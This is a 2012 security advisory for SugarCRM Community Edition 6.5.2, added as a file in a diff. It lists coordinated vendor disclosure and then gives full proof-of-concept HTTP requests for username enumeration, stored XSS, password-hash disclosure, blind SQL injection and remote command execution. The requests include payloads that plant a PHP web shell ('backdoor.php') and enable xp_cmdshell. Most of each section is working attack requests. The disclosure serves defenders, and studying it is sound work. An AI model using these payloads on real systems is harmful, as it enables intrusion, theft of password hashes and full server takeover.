@@ -1,0 +1,384 @@
+################################################################################
+# SugarCRM Community Edition 6.5.2 (Build 8410) multiple vulnerabilities       #
+################################################################################
+# Brendan Coles # http://itsecuritysolutions.org/                 # 2012-07-26 #
+################################################################################
+
+There are multiple security vulnerabilities in SugarCRM Community Edition 6.5.2 
+(Build 8410) which may allow an attacker to take control of the software.
+
+# Version:  6.5.2 (Build 8410)
+# Homepage: http://sugarcrm.com/
+# Vendor Notification:
+  # 2012-07-26 -> secure@sugarcrm.com
+  # 2012-07-27 <- vendor confirmed receipt
+  # 2012-07-29 -> request for patch date
+  # 2012-07-31 <- vendor advised issues will be patched in 6.5.3
+  # 2012-08-24 -- vendor released 6.5.3
+  # 2012-08-30 -- advisory released
+
+################################################################################
+# Packaged Software                                                            #
+################################################################################
+
+SugarCRM Community Edition 6.5.2 (Build 8410) comes in multiple flavors:
+
+# FastStack Windows Installer 6.5.2 with MySQL
+Apache          2.2.21
+MySQL           5.5.16
+PHP             5.3.8
+phpMyAdmin      3.4.8
+Zend Framework  1.10.8
+
+# FastStack Windows Installer 6.5.2 with SQL Server
+Apache          2.2.21
+Microsoft SQL Server Express 2005
+PHP             5.3.8
+Zend Framework  1.10.8
+
+# FastStack Linux Installer 6.5.2 with MySQL
+Apache          2.2.21
+MySQL           5.5.16
+PHP             5.3.8
+phpMyAdmin      3.4.8
+Zend Framework  1.10.8
+
+# FastStack Mac OS X Installer 6.5.2 with MySQL # Not tested
+Apache
+MySQL
+PHP
+Zend Framework
+
+
+################################################################################
+# Information Disclosure # Full Path Disclosure # Unauthenticated              #
+################################################################################
+
+The application creates the following file once any user has authenticated and 
+completed the "wizard" introduction.
+
+/sugarcrm/cache/include/externalAPI.cache.js
+
+This file leaks some application details including the local file path.
+
+
+################################################################################
+# Information Disclosure # Username Enumeration # Unauthenticated              #
+################################################################################
+
+Unauthenticated users can enumerate valid usernames and user e-mail addresses.
+
+The following proof of concept is available:
+
+/sugarcrm/vcal_server.php?type=vfb&email=will@example.com
+/sugarcrm/vcal_server.php?type=vfb&user_name=will
+
+
+################################################################################
+# Information Disclosure # User Schedules # Unauthenticated                    #
+################################################################################
+
+By default all users have an empty key for the iCalendar allowing 
+unauthenticated users to see users' schedules.
+
+The following proof of concept is available:
+
+/sugarcrm/ical_server.php?type=ics&key=&email=will@example.com
+/sugarcrm/ical_server.php?type=ics&key=&user_name=will
+
+
+################################################################################
+# Persistent Cross-Site Scripting (XSS) # Authenticated - User Role            #
+################################################################################
+
+The following proof of concept is available:
+
+POST /sugarcrm/index.php HTTP/1.1
+Host: 192.168.123.123
+Referer: http://127.0.0.1/
+Cookie: PHPSESSID=eefo76fskvd5qfpa0oqsd7a5i2
+Content-Type: multipart/form-data; boundary=---------------------------2921238217421
+Content-Length: 496
+
+-----------------------------2921238217421
+Content-Disposition: form-data; name="module"
+
+Documents
+-----------------------------2921238217421
+Content-Disposition: form-data; name="action"
+
+Save
+-----------------------------2921238217421
+Content-Disposition: form-data; name="filename_file"; filename="anything.jpg"
+Content-Type: image/jpeg
+
+<script>alert(document.cookie+" on "+document.domain)</script>
+
+-----------------------------2921238217421
+
+
+# Response:
+
+HTTP/1.1 301 Moved Permanently
+Date: Mon, 23 Jul 2012 11:08:38 GMT
+Server: Apache
+X-Powered-By: PHP/5.3.8
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: ck_login_id_20=1; expires=Sun, 21-Oct-2012 11:08:38 GMT; path=/; domain=192.168.123.123
+Set-Cookie: ck_login_language_20=en_us; expires=Sun, 21-Oct-2012 11:08:38 GMT; path=/; domain=192.168.123.123
+Set-Cookie: sugar_user_theme=Sugar5; expires=Tue, 23-Jul-2013 11:08:38 GMT
+Location: index.php?module=Documents&action=DetailView&record=b60e0d55-9ed3-6ce7-c7b5-500d307bd0ca
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+
+
+# View the payload here:
+
+/sugarcrm/index.php?entryPoint=download&id=b60e0d55-9ed3-6ce7-c7b5-500d307bd0ca&type=Documents
+
+
+################################################################################
+# Persistent Cross-Site Scripting (XSS) # Authenticated - User Role            #
+################################################################################
+
+The following proof of concept is available:
+
+POST /sugarcrm/index.php HTTP/1.1
+Host: 192.168.123.123
+Referer: http://127.0.0.1/
+Cookie: PHPSESSID=eefo76fskvd5qfpa0oqsd7a5i2
+Content-Type: multipart/form-data; boundary=---------------------------2921238217421
+Content-Length: 658
+
+-----------------------------2921238217421
+Content-Disposition: form-data; name="module"
+
+Notes
+-----------------------------2921238217421
+Content-Disposition: form-data; name="action"
+
+Save
+-----------------------------2921238217421
+Content-Disposition: form-data; name="filename_file"; filename="anything.jpg"
+Content-Type: image/jpeg
+
+<script>alert(document.cookie+" on "+document.domain)</script>
+
+-----------------------------2921238217421
+
+
+# Response:
+
+HTTP/1.1 301 Moved Permanently
+Date: Mon, 23 Jul 2012 11:08:38 GMT
+Server: Apache
+X-Powered-By: PHP/5.3.8
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: ck_login_id_20=1; expires=Sun, 21-Oct-2012 11:08:38 GMT; path=/; domain=192.168.123.123
+Set-Cookie: ck_login_language_20=en_us; expires=Sun, 21-Oct-2012 11:08:38 GMT; path=/; domain=192.168.123.123
+Set-Cookie: sugar_user_theme=Sugar5; expires=Tue, 23-Jul-2013 11:08:38 GMT
+Location: index.php?module=Notes&action=DetailView&record=6403f695-bc09-25b9-9140-500d41008d09
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+
+
+# View the payload here:
+
+/sugarcrm/index.php?entryPoint=download&id=6403f695-bc09-25b9-9140-500d41008d09&type=Notes
+
+
+################################################################################
+# Information Disclosure # User Hash Disclosure # Authenticated - User Role    #
+################################################################################
+
+An authenticated user can view the password hashes of all users.
+
+The following proof of concept is available:
+
+POST /sugarcrm/index.php?entryPoint=json_server HTTP/1.1
+Host: 192.168.123.123
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 144
+Cookie: PHPSESSID=82liivpdso6dtt4o010rsb3is7
+
+{"method":"query","id":"anything","params":[{"modules":["Users"],"group":"and","field_list":["user_name","first_name","last_name","is_admin","user_hash","system_generated_password"]}]}
+
+
+################################################################################
+# Blind SQL Injection # Authenticated - User Role                              #
+################################################################################
+
+# MySQL on Windows and Linux
+
+The following proof of concept is available:
+
+POST /sugarcrm/index.php?entryPoint=json_server HTTP/1.1
+Host: 192.168.123.123
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 215
+Cookie: PHPSESSID=82liivpdso6dtt4o010rsb3is7
+
+{"method":"query","id":"anything","params":[{"modules":["Users"],"group":") and substring(version(),1,6) like '5.5.16'--","field_list":["user_name"],"conditions":[{"name":"user_name","op":"starts_with","value":"%"}]}]}
+
+
+# MSSQL on Windows
+
+The following proof of concept is available:
+
+POST /sugarcrm/index.php?entryPoint=json_server HTTP/1.1
+Host: 192.168.123.123
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Cookie: PHPSESSID=82liivpdso6dtt4o010rsb3is7
+Content-Length: 238
+
+{"method":"query","id":"anything","params":[{"modules":["Users"],"group":") and substring(@@version,1,25) like 'microsoft sql server 2005'--","field_list":["user_name"],"conditions":[{"name":"user_name","op":"starts_with","value":"%"}]}]}
+
+
+################################################################################
+# Remote Command Execution # Authenticated - User Role                         #
+################################################################################
+
+# MySQL on Windows
+
+The default MySQL configuration allows arbitrary command execution, if it is 
+running on the same host as the web server, by leveraging the aforementioned 
+blind SQL injection.
+
+The following proof of concept is available:
+
+POST /sugarcrm/index.php?entryPoint=json_server HTTP/1.1
+Host: 192.168.123.123
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 207
+Cookie: PHPSESSID=82liivpdso6dtt4o010rsb3is7
+
+{"method":"query","id":"anything","params":[{"modules":["Users"],"group":") union select \"<?php @system($_REQUEST['cmd']); ?>\" FROM users INTO OUTFILE 'C://Program Files//sugarcrm-6.5.2//apps//sugarcrm//htdocs//backdoor.php'--","field_list":["user_name"],"conditions":[{"name":"user_name","op":"starts_with","value":"%"}]}]}
+
+# View the backdoor here:
+
+/sugarcrm/backdoor.php?cmd=dir
+
+
+# MSSQL on Windows
+
+The default MSSQL configuration allows arbitrary command execution on the 
+database server by leveraging the aforementioned blind SQL injection.
+
+The following proof of concept is available:
+
+POST /sugarcrm/index.php?entryPoint=json_server HTTP/1.1
+Host: 192.168.123.123
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 207
+Cookie: PHPSESSID=82liivpdso6dtt4o010rsb3is7
+
+{"method":"query","id":"anything","params":[{"modules":["Users"],"group":");EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXEC master..xp_cmdshell 'calc.exe';--","field_list":["user_name"],"conditions":[{"name":"user_name","op":"starts_with","value":"%"}]}]}
+
+
+# MySQL on Linux
+
+By default the database user does not have write access to the web root in the 
+FastStack Linux Installer.
+
+
+################################################################################
+# Remote Command Execution # Authenticated - Administrator Role                #
+################################################################################
+
+A user with Administrator roles can execute arbitrary commands by abusing the 
+logging functionality.
+
+The following proof of concept is available:
+
+# Change the log file name to backdoor.php
+
+POST /sugarcrm/index.php HTTP/1.1
+Host: 192.168.123.123
+Referer: http://127.0.0.1/
+Cookie: PHPSESSID=s8hdjjam3t6i8of9vvc6702mc4;
+Content-Type: multipart/form-data; boundary=---------------------------295221455122937
+Content-Length: 592
+
+-----------------------------295221455122937
+Content-Disposition: form-data; name="action"
+
+SaveConfig
+-----------------------------295221455122937
+Content-Disposition: form-data; name="module"
+
+Configurator
+-----------------------------295221455122937
+Content-Disposition: form-data; name="logger_file_name"
+
+backdoor
+-----------------------------295221455122937
+Content-Disposition: form-data; name="logger_file_ext"
+
+.php
+-----------------------------295221455122937
+Content-Disposition: form-data; name="save"
+
+  Save  
+-----------------------------295221455122937--
+
+
+# Write to the error log 'backdoor.php' by triggering a database error
+
+POST /sugarcrm/index.php?entryPoint=json_server HTTP/1.1
+Host: 192.168.123.123
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Cookie: PHPSESSID=s8hdjjam3t6i8of9vvc6702mc4;
+Content-Length: 230
+
+{"method":"query","id":"anything","params":[{"modules":["Users"],"group":") union select \"<?php @system($_REQUEST[\"cmd\"]); ?>\"--","field_list":["user_name"],"conditions":[{"name":"user_name","op":"starts_with","value":"%"}]}]}
+
+
+# View the backdoor here:
+
+/sugarcrm/backdoor.php?cmd=dir
+
+
+# Change the log file name back to "sugarcrm.log"
+
+POST /sugarcrm/index.php HTTP/1.1
+Host: 192.168.123.123
+Referer: http://127.0.0.1/
+Cookie: PHPSESSID=s8hdjjam3t6i8of9vvc6702mc4;
+Content-Type: multipart/form-data; boundary=---------------------------295221455122937
+Content-Length: 592
+
+-----------------------------295221455122937
+Content-Disposition: form-data; name="action"
+
+SaveConfig
+-----------------------------295221455122937
+Content-Disposition: form-data; name="module"
+
+Configurator
+-----------------------------295221455122937
+Content-Disposition: form-data; name="logger_file_name"
+
+sugarcrm
+-----------------------------295221455122937
+Content-Disposition: form-data; name="logger_file_ext"
+
+.log
+-----------------------------295221455122937
+Content-Disposition: form-data; name="save"
+
+  Save  
+-----------------------------295221455122937--
+
+
+################################################################################
+EOF
